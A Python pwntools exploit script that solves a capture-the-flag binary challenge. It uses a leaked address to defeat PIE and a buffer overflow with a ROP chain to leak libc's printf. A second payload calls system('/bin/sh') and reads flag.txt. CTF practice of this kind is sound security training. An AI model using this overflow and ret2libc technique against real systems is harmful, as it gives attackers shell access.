#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host sharkyctf.xyz --port 20335
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = context.binary = ELF('./give_away_2')
context.terminal = ["xfce4-terminal", "-e"]
#io = process([exe.path] + argv, *a, **kw)
io = process(['./give_away_2'], env={"LD_PRELOAD":"./libc-2.27.so"})
#io = remote('sharkyctf.xyz', 20335)

libc = ELF('./libc-2.27.so')

#libc = ELF('/data/glibc-2.27_out/lib/libc.so.6')

main = int(io.recvline_startswith(b'Give')[-12:], 0x10)


# calculating the base address for the executable
exe.address = main-exe.sym['main']
rop = ROP(exe)

printf = exe.sym['printf']
printfgot = exe.got['printf']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
vuln = exe.sym['vuln']

# this is the address of the printf part in main
print_giveaway = exe.address+0x880

payload1 = 40*b'A'
# pops rdi from stack which is printfgot and then returns to print_giveaway

payload1 += p64(pop_rdi) + p64(printfgot) + p64(print_giveaway)
io.sendline(payload1)

# the returned give away now is printf address in libc
printflibc = unpack(
    io.recv(), 'all', sign=False)

# after the give away is printed vuln gets called so we can send another payload

libc.address = printflibc-libc.sym["printf"]
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

# we pop rdi from stack which is binsh to pass it to system function
# for some reason I had to call system twice to get it to work on the server
# let me know why in the comments Plz
payload2 = 40*b'A' + p64(pop_rdi) + p64(binsh) + p64(system) + \
    p64(pop_rdi) + p64(binsh) + p64(system)

io.sendline(payload2)
io.sendline("cat flag.txt")

print(io.recv())

